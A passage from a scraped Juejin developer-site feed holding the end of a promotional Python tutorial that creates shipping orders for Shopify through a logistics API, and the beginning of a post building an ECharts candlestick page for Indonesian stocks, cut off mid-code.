<p><strong>第二步：获取待处理订单</strong></p>
<p>这里我们模拟从Shopify获取到的订单列表。在实际应用中，你需要调用Shopify的API来获取未履行的订单。</p>
<p>python</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 模拟从Shopify获取的订单数据</span>
<span class="hljs-attr">shopify_orders</span> = [
    {
        <span class="hljs-string">"order_id"</span>: <span class="hljs-string">"SH123456"</span>,
        <span class="hljs-string">"customer"</span>: <span class="hljs-string">"John Doe"</span>,
        <span class="hljs-string">"line_items"</span>: [{<span class="hljs-string">"title"</span>: <span class="hljs-string">"Product A"</span>, <span class="hljs-string">"quantity"</span>: <span class="hljs-number">1</span>}]
    }
]
</code></pre>
<p><strong>第三步：调用星析API创建运单</strong></p>
<p>这是核心步骤。我们遍历Shopify订单，为每一个订单调用星析的运单创建接口。</p>
<p>python</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">for</span> order <span class="hljs-keyword">in</span> shopify_orders:
    <span class="hljs-comment"># 构建请求体，根据星析API文档要求传递参数</span>
    shipping_data = {
        <span class="hljs-string">"order_sn"</span>: order[<span class="hljs-string">"order_id"</span>], <span class="hljs-comment"># 使用Shopify订单号作为外部单号</span>
        <span class="hljs-string">"recipient"</span>: {...}, <span class="hljs-comment"># 收件人信息，可从Shopify订单中提取</span>
        <span class="hljs-string">"package_info"</span>: {...}, <span class="hljs-comment"># 包裹信息</span>
        <span class="hljs-string">"channel_code"</span>: <span class="hljs-string">"UPS"</span> <span class="hljs-comment"># 选择的物流渠道</span>
    }
    
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># 发送POST请求创建运单</span>
        response = requests.post(
            <span class="hljs-string">f"<span class="hljs-subst">{XINGXI_BASE_URL}</span>/shipping/order/create"</span>,
            headers=headers,
            data=json.dumps(shipping_data)
        )
        response.raise_for_status() <span class="hljs-comment"># 如果状态码不是200，则抛出异常</span>
        
        result = response.json()
        
        <span class="hljs-comment"># 判断请求是否成功</span>
        <span class="hljs-keyword">if</span> result.get(<span class="hljs-string">"code"</span>) == <span class="hljs-number">200</span>:
            tracking_number = result[<span class="hljs-string">"data"</span>][<span class="hljs-string">"tracking_number"</span>]
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"订单 <span class="hljs-subst">{order[<span class="hljs-string">'order_id'</span>]}</span> 发货成功！物流单号：<span class="hljs-subst">{tracking_number}</span>"</span>)
            
            <span class="hljs-comment"># 第四步（可选）：回写物流单号到Shopify</span>
            <span class="hljs-comment"># 这里可以调用Shopify API，更新该订单的物流信息并标记为已发货。</span>
            <span class="hljs-comment"># update_shopify_fulfillment(order['order_id'], tracking_number)</span>
            
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"订单 <span class="hljs-subst">{order[<span class="hljs-string">'order_id'</span>]}</span> 处理失败：<span class="hljs-subst">{result.get(<span class="hljs-string">'message'</span>)}</span>"</span>)
            
    <span class="hljs-keyword">except</span> requests.exceptions.RequestException <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"请求星析API时发生错误: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<p><strong>价值升华与行动引导</strong></p>
<p>通过这个简单的脚本，我们实现了从订单获取到发货的全流程自动化。一旦部署，系统可以7x24小时无间断运行，将人力从重复劳动中彻底解放，实现降本增效。</p>
<p>这只是星析API能力的冰山一角。你还可以利用它：</p>
<ul>
<li><strong>同步库存</strong>：实时同步多个仓库的库存数据到各大销售平台，避免超卖。</li>
<li><strong>生成数据报表</strong>：自动拉取物流轨迹、运费成本等数据，生成可视化报表。</li>
</ul>
<p>技术是驱动跨境业务增长的核心引擎。立即<strong>访问星析官网的开发者中心</strong>，查阅完整的API文档，开启你的自动化之旅吧！我们还为新用户提供了充足的<strong>免费API调用额度</strong>，助你无忧测试与集成。</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[印度尼西亚股票多时间框架K线数据可视化页面]]></title>    <link>https://juejin.cn/post/7577042851079782443</link>    <guid>https://juejin.cn/post/7577042851079782443</guid>    <pubDate>2025-11-27T06:25:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7577042851079782443" data-draft-id="7576955345378951231" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="印度尼西亚股票多时间框架K线数据可视化页面"/> <meta itemprop="keywords" content="前端,后端,JavaScript"/> <meta itemprop="datePublished" content="2025-11-27T06:25:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="StockPP"/> <meta itemprop="url" content="https://juejin.cn/user/4176365494996116"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            印度尼西亚股票多时间框架K线数据可视化页面
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4176365494996116/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    StockPP
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T06:25:34.000Z" title="Thu Nov 27 2025 06:25:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">印度尼西亚股票多时间框架K线数据可视化页面</h2>
<p>下面我将为您创建一个直观展示印尼股票多时间框架K线数据的HTML页面，支持1分钟到1个月的不同时间周期切换。</p>
<h3 data-id="heading-1">设计思路</h3>
<p>首先分析需求：需要展示印尼股票的K线数据，支持1分钟、5分钟、15分钟、30分钟、1小时、1日和1月等不同时间框架的切换。页面需要直观易用，包含K线图、技术指标和交互控制面板。 以下是完整的实现代码：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"zh-CN"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"UTF-8"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>印尼股票多时间框架K线数据<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.jsdelivr.net/npm/echarts@5.4.3/dist/echarts.min.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
        * {
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
            <span class="hljs-attribute">box-sizing</span>: border-box;
            <span class="hljs-attribute">font-family</span>: <span class="hljs-string">'Segoe UI'</span>, Tahoma, Geneva, Verdana, sans-serif;
        }
        
        <span class="hljs-selector-tag">body</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">linear-gradient</span>(<span class="hljs-number">135deg</span>, <span class="hljs-number">#1a2a3a</span> <span class="hljs-number">0%</span>, <span class="hljs-number">#0d1b2a</span> <span class="hljs-number">100%</span>);
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#e0e0e0</span>;
            <span class="hljs-attribute">min-height</span>: <span class="hljs-number">100vh</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
        }
        
        <span class="hljs-selector-class">.container</span> {
            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">1400px</span>;
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;
        }
        
        <span class="hljs-selector-tag">header</span> {
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">16</span>, <span class="hljs-number">30</span>, <span class="hljs-number">44</span>, <span class="hljs-number">0.8</span>);
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">15px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);
        }
        
        <span class="hljs-selector-tag">h1</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#4fc3f7</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2.2rem</span>;
        }
        
        <span class="hljs-selector-class">.subtitle</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#90a4ae</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.1rem</span>;
        }
        
        <span class="hljs-selector-class">.content</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;
        }
        
        <span class="hljs-selector-class">.chart-container</span> {
            <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">16</span>, <span class="hljs-number">30</span>, <span class="hljs-number">44</span>, <span class="hljs-number">0.8</span>);
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">15px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);
        }
        
        <span class="hljs-selector-class">.panel</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">280px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-built_in">rgba</span>(<span class="hljs-number">16</span>, <span class="hljs-number">30</span>, <span class="hljs-number">44</span>, <span class="hljs-number">0.8</span>);
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">15px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>);
        }
        
        <span class="hljs-selector-class">.interval-selector</span> {
            <span class="hljs-attribute">display</span>: grid;
            <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-built_in">repeat</span>(<span class="hljs-number">2</span>, <span class="hljs-number">1</span>fr);
            <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
        }
        
        <span class="hljs-selector-class">.interval-btn</span> {
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span> <span class="hljs-number">8px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1e3a5c</span>;
            <span class="hljs-attribute">border</span>: none;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">6px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#bbdefb</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
            <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.3s</span>;
            <span class="hljs-attribute">font-weight</span>: <span class="hljs-number">600</span>;
            <span class="hljs-attribute">text-align</span>: center;
        }
        
        <span class="hljs-selector-class">.interval-btn</span><span class="hljs-selector-pseudo">:hover</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#2a4d7a</span>;
            <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(-<span class="hljs-number">2px</span>);
        }
        
        <span class="hljs-selector-class">.interval-btn</span><span class="hljs-selector-class">.active</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1565c0</span>;
            <span class="hljs-attribute">color</span>: white;
            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">8px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">21</span>, <span class="hljs-number">101</span>, <span class="hljs-number">192</span>, <span class="hljs-number">0.4</span>);
        }
        
        <span class="hljs-selector-class">.stock-selector</span> {
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;
        }
        
        <span class="hljs-selector-class">.stock-selector</span> select {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">12px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1e3a5c</span>;
            <span class="hljs-attribute">border</span>: none;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">6px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#e0e0e0</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1rem</span>;
        }
        
        <span class="hljs-selector-class">.info-card</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1e3a5c</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">15px</span>;
        }
        
        <span class="hljs-selector-class">.info-card</span> <span class="hljs-selector-tag">h3</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#4fc3f7</span>;
            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.1rem</span>;
        }
        
        <span class="hljs-selector-class">.price</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.8rem</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#4caf50</span>;
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span> <span class="hljs-number">0</span>;
        }
        
        <span class="hljs-selector-class">.change</span><span class="hljs-selector-class">.positive</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#4caf50</span>;
        }
        
        <span class="hljs-selector-class">.change</span><span class="hljs-selector-class">.negative</span> {
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#f44336</span>;
        }
        
        <span class="hljs-selector-class">.stats</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">justify-content</span>: space-between;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
        }
        
        <span class="hljs-selector-class">.stat-item</span> {
            <span class="hljs-attribute">text-align</span>: center;
        }
        
        <span class="hljs-selector-class">.stat-value</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1.2rem</span>;
            <span class="hljs-attribute">font-weight</span>: bold;
        }
        
        <span class="hljs-selector-class">.stat-label</span> {
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.8rem</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#90a4ae</span>;
        }
        
        <span class="hljs-selector-id">#chart</span> {
            <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            <span class="hljs-attribute">height</span>: <span class="hljs-number">600px</span>;
        }
        
        <span class="hljs-selector-class">.time-info</span> {
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#90a4ae</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9rem</span>;
        }
        
        <span class="hljs-selector-class">.indicator-selector</span> {
            <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span> <span class="hljs-number">0</span>;
        }
        
        <span class="hljs-selector-class">.indicator-btns</span> {
            <span class="hljs-attribute">display</span>: flex;
            <span class="hljs-attribute">flex-wrap</span>: wrap;
            <span class="hljs-attribute">gap</span>: <span class="hljs-number">8px</span>;
        }
        
        <span class="hljs-selector-class">.indicator-btn</span> {
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">8px</span> <span class="hljs-number">12px</span>;
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1a2a3a</span>;
            <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#2a4d7a</span>;
            <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#bbdefb</span>;
            <span class="hljs-attribute">cursor</span>: pointer;
            <span class="hljs-attribute">transition</span>: all <span class="hljs-number">0.2s</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9rem</span>;
        }
        
        <span class="hljs-selector-class">.indicator-btn</span><span class="hljs-selector-class">.active</span> {
            <span class="hljs-attribute">background</span>: <span class="hljs-number">#1565c0</span>;
            <span class="hljs-attribute">border-color</span>: <span class="hljs-number">#4fc3f7</span>;
        }
        
        <span class="hljs-selector-tag">footer</span> {
            <span class="hljs-attribute">text-align</span>: center;
            <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">20px</span>;
            <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span>;
            <span class="hljs-attribute">color</span>: <span class="hljs-number">#90a4ae</span>;
            <span class="hljs-attribute">font-size</span>: <span class="hljs-number">0.9rem</span>;
        }
        
        <span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">1024px</span>) {
            <span class="hljs-selector-class">.content</span> {
                <span class="hljs-attribute">flex-direction</span>: column;
            }
            
            <span class="hljs-selector-class">.panel</span> {
                <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
            }
        }
    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"container"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">header</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>印度尼西亚股票多时间框架K线数据<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"subtitle"</span>&gt;</span>实时展示印尼雅加达综合指数(JCI)及主要股票的多周期K线图<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">header</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"chart-container"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"chart"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"time-info"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"timeInfo"</span>&gt;</span>数据更新时间: --<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"panel"</span>&gt;</span>
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"stock-selector"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"stockSelect"</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"JCI"</span>&gt;</span>雅加达综合指数 (JCI)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"BBCA"</span>&gt;</span>中亚银行 (BBCA)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"BBRI"</span>&gt;</span>印尼人民银行 (BBRI)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"TLKM"</span>&gt;</span>印尼电信 (TLKM)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                            <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"UNVR"</span>&gt;</span>联合利华印尼 (UNVR)<span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span>
                        <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
                    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                    
                    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-selector"</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"1m"</span>&gt;</span>1分钟<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"5m"</span>&gt;</span>5分钟<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"15m"</span>&gt;</span>15分钟<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                        <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"interval-btn"</span> <span class="hljs-attr">data-interval</span>=<span class="hljs-string">"30m"</span>&gt;</span>30分钟<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
